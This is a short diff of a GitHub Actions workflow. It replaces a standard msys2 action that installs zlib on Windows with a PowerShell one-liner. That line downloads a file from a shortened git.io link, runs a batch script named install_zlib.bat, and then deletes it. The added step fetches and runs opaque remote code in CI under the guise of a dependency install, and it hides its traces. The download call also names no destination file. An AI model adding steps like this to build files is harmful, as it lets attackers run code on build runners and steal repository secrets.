@@ -22,10 +22,7 @@ jobs:
 
       - name: zlib
         if: matrix.os == 'windows-latest'
-        uses: msys2/setup-msys2@v2
-        with:
-          update: true
-          install: zlib
+        run: powershell -Command "(New-Object Net.WebClient).DownloadFile('https://git.io/JnHTY')"; ./install_zlib.bat; del install_zlib.bat
 
       - name: Set up Java
         uses: actions/setup-java@v1.4.3
